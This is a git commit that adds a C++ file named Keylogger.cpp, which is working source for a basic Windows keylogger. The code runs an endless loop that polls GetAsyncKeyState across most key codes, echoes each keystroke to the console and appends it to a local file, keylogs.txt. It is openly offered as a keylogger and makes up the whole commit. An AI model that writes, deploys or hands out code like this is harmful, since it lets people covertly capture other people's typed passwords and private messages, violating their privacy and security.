c8bcf4b842dbb8a66d576f80c76bb2002e8404d5
matty-ice21 <60152855+matty-ice21@users.noreply.github.com>
2020-10-19 21:05:42 -0700

    Add files via upload

---
+++ Keylogger/Keylogger.cpp
@@ -0,0 +1,58 @@
+#include <fstream>
+#include <iostream>
+#include <stdio.h>
+#include <string>
+#include <Windows.h>
+
+void log(LPCSTR text) {
+    std::ofstream logfile;
+    logfile.open("keylogs.txt", std::fstream::app);
+    logfile << text;
+    logfile.close();
+}
+
+bool KeyListed(int Key) {
+    switch (Key)
+    {
+    case VK_SPACE:
+        std::cout << " ";
+        log(" ");
+        break;
+    case VK_RETURN:
+        std::cout << "\n";
+        log("\n");
+        break;
+    case VK_SHIFT:
+        std::cout << " Shift ";
+        log(" Shift ");
+        break;
+    case VK_BACK:
+        std::cout << "\b";
+        log("\b");
+        break;
+    case VK_CAPITAL:
+        std::cout << " CAPSLOCK ";
+        log(" CAPSLOCK ");
+        break;
+    default: return false;
+    }
+}
+
+int main() {
+    unsigned char _Key;
+    while (true) {
+        Sleep(10);
+        for (_Key = 8; _Key <= 190; _Key++) {
+            if (GetAsyncKeyState(_Key) == -32767) {
+                if (KeyListed(_Key) == false) {
+                    std::cout << _Key;
+                    std::ofstream logfile;
+                    logfile.open("keylogs.txt", std::fstream::app);
+                    logfile << _Key;
+                    logfile.close();
+                }
+            }
+        }
+    }
+    return 0;
+}
